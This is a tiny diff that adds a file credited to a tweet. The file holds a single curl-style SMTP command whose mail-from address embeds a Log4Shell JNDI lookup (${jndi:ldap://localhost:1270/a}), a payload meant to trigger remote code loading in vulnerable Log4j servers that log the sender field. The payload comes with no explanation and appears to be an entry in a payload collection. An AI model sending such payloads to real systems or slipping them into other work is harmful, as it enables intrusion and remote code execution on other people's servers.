@@ -1,0 +1,3 @@
+# Source: https://twitter.com/sirifu4k1/status/1470011568834424837
+
+smtp://localhost" --user "test:test" --mail-from '${jndi:ldap://localhost:1270/a}@gmail.com' --mail-rcpt 'test' --upload-file email.txt 
